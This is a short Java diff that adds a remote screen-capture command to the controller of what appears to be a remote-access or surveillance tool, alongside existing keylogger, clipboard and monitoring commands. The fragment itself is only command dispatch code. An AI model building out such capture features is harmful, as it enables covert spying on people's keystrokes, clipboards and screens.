@@ -22,6 +22,11 @@ public class ProduceController {
         put(COMMAND_MONITORING, ProduceController::getMonitoring);
         put(COMMAND_CLIPBOARD, ProduceController::getClipboard);
         put(COMMAND_KEYLOGGER, ProduceController::getKeylogger);
+        put(COMMAND_CLIENT_SCREEN, ProduceController::getScreen);
+    }
+
+    private static String getScreen(Admin admin) {
+        return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_CLIENT_SCREEN).json();
     }
 
     private static String getMonitoring(Admin admin) {
